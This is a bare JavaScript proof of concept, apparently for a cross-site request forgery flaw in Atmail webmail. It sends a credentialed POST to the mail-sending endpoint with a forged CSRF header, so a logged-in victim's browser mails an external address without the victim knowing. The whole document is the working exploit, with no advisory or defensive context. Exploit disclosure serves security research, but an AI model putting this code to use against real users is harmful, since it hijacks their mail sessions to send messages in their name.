var xhr = new XMLHttpRequest();
xhr.open("POST", "https://demo.atmail.com/index.php/mobile/index/send", true);
xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
xhr.setRequestHeader("X-CSRF", 1);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.withCredentials = true;
var body = "emailTo=smash@devilteam.plemail&Cc=&emailBcc=&emailSubject=abc&emailBodyText=abcwoot";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 
xhr.send(new Blob([aBody]));
